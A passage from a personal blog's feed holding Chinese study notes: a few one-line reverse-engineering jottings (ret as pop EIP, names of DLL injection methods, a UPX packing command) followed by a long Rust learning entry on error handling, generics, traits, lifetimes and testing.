href="#Ret相当于-Pop-EIP" class="headerlink" title="Ret相当于 Pop EIP"></a>Ret相当于 Pop EIP</h4><hr><h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>threadProc 线程创建函数<br>用句柄控制相应进程<br>三种方法：<br>创建远程线程<br>钩子注入<br>设置里全局注入</p><p>SPaCIoS</p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;UPX&quot;&gt;&lt;a href=&quot;#UPX&quot; class=&quot;headerlink&quot; title=&quot;UPX&quot;&gt;&lt;/a&gt;UPX&lt;/h4&gt;&lt;p&gt;upx == 加壳？&lt;br&gt;代码压缩器，执行时解码后运行&lt;br&gt;PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习4</title>
    <link href="http://finsenty54.github.io/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/"/>
    <id>http://finsenty54.github.io/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/</id>
    <published>2020-08-14T04:26:23.000Z</published>
    <updated>2020-10-31T08:53:12.116Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesn’t have exceptions. Instead, it has the type<code> Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p><p>When the <code>panic! </code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit. </p><a id="more"></a><p>result enum is defined as having two variants<code>, Ok and Err,</code></p><p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match </code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).unwrap();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).expect(<span class="string">&quot;Failed to open hello.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Propagating Errors</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p><p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File::open(<span class="string">&quot;hello.txt&quot;</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">&quot;hello.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p> If you can ensure by manually inspecting the code that you’ll never have an Err variant, it’s perfectly acceptable to call<code> unwrap.</code> Here’s an example:</p><h3 id="Generic-泛型"><a href="#Generic-泛型" class="headerlink" title="Generic 泛型"></a>Generic 泛型</h3><p>将代码抽取出来，减少重复代码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T U代表不同的类型</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p.x = &#123;&#125;&quot;</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that we have to declare <code>T just after impl </code>so we can use it to specify that we’re implementing methods on the type Point<T>.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">&quot;Hello&quot;</span>, <span class="symbol">y:</span> <span class="string">&#x27;c&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p3.x = &#123;&#125;, p3.y = &#123;&#125;&quot;</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p><p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>相当于提供一个接口，具体内容自己实现</code><br>与Java一个概念类似</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>添加trait到结构中</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;, by &#123;&#125; (&#123;&#125;)&quot;</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, they’re all in the same scope. Let’s say this lib.rs is for a crate we’ve called aggregator and someone else wants to use our crate’s functionality to implement the Summary trait on a struct defined within their library’s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p><p>with trait implementations is that we can<code> implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>can’t implement external traits on external types.</code></p><p>as we implement the trait on a particular type, we can keep or override each method’s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">&quot;(Read more...)&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Default implementations can call other methods in the same trait, even if those other methods don’t have a default implementation.</p><p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p><pre><code>fn summarize(&amp;self) -&gt; String &#123;    format!(&quot;(Read more from &#123;&#125;...)&quot;, self.summarize_author())&#125;</code></pre><p>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(“@{}”, self.username)<br>    }<br>}<br>}</p><p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p><p>pub fn notify(item: &amp;impl Summary) {<br>    println!(“Breaking news! {}”, item.summarize());<br>}</p><h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>传入的类型必须相同</p><pre><code>pub fn notify(item: &amp;(impl Summary + Display)) &#123;pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) &#123;fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32    where T: Display + Clone,          U: Clone + Debug&#123;</code></pre><p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p><p>fn returns_summarizable() -&gt; <code>impl Summary &#123;</code><br>    Tweet {<br>        username: String::from(“horse_ebooks”),<br>        content: String::from(<br>            “of course, as you probably already know, people”,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>限制只能传进i32 char等</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p><pre><code>let result = largest(&amp;number_list);println!(&quot;The largest number is &#123;&#125;&quot;, result);let char_list = vec![&#39;y&#39;, &#39;m&#39;, &#39;a&#39;, &#39;q&#39;];let result = largest(&amp;char_list);println!(&quot;The largest char is &#123;&#125;&quot;, result);</code></pre><p>}</p><p>impl&lt;T: Display&gt; ToString for T {<br>    // –snip–<br>}</p><h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>we’ll add generic lifetime parameters that define the relationship between the references </p><p>lifetime<br>Lifetime annotations <code>don’t change</code> how long any of the references live. </p><pre><code>&amp;i32        // a reference&amp;&#39;a i32     // a reference with an explicit lifetime&amp;&#39;a mut i32 // a mutable reference with an explicit lifetime</code></pre><p>have a function with the parameter first that is a reference to an i32 with lifetime ‘a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime ‘a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">&quot;abcd&quot;</span>);</span><br><span class="line">    let string2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">&quot;The longest string is &#123;&#125;&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">&#x27;a&gt;(x: &amp;&#x27;</span>a str, <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str) -&gt; &amp;&#x27;</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>返回的引用取最短的lifetime</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">&#x27;a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;&#x27;</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">&quot;Call me Ishmael. Some years ago...&quot;</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">&#x27;.&#x27;</span>).<span class="keyword">next</span>().expect(<span class="string">&quot;Could not find a &#x27;.&#x27;&quot;</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>an instance of ImportantExcerpt can’t <code>outlive the reference it</code><br>holds in its part field.</p><h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>由编译器进行引用lifetime的编写<br>三个阶段</p><h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">&#x27;static str = &quot;I have a static lifetime.&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>means that this reference can live for the entire duration of the program</p><p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(“abcd”);<br>    let string2 = “xyz”;</p><pre><code>let result = longest_with_an_announcement(    string1.as_str(),    string2,    &quot;Today is someone&#39;s birthday!&quot;,);println!(&quot;The longest string is &#123;&#125;&quot;, result);</code></pre><p>}</p><p>use std::fmt::Display;</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">&#x27;a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;&#x27;</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">&#x27;a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;&#x27;</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">&quot;Announcement! &#123;&#125;&quot;</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert! </code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p><p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p><p>should_panic  产生panic返回正确</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">&quot;Guess value must be between 1 and 100, got &#123;&#125;.&quot;</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = &quot;Guess value must be less than or equal to 100&quot;)]</span></span><br></pre></td></tr></table></figure><p>the unit type, ()</p><p>TDD process</p><p>test 还是很不多的，C++的时候都一遍遍输入参数</p><p><code>$ cargo run &gt; output.txt</code></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Result-lt-T-E-gt&quot;&gt;&lt;a href=&quot;#Result-lt-T-E-gt&quot; class=&quot;headerlink&quot; title=&quot;Result&amp;lt;T, E&amp;gt;&quot;&gt;&lt;/a&gt;Result&lt;code&gt;&amp;lt;T, E&amp;gt;&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;Rust doesn’t have exceptions. Instead, it has the type&lt;code&gt; Result&amp;lt;T, E&amp;gt;&lt;/code&gt; for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. &lt;/p&gt;
&lt;p&gt;When the &lt;code&gt;panic! &lt;/code&gt;macro executes, your program will print a failure message, unwind and clean up the stack, and then quit. &lt;/p&gt;</summary>
    
    
    
    
    <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习3</title>
    <link href="http://finsenty54.github.io/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/"/>
    <id>http://finsenty54.github.io/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/</id>
    <published>2020-08-03T05:58:28.000Z</published>
    <updated>2020-10-31T08:53:12.116Z</updated>
    
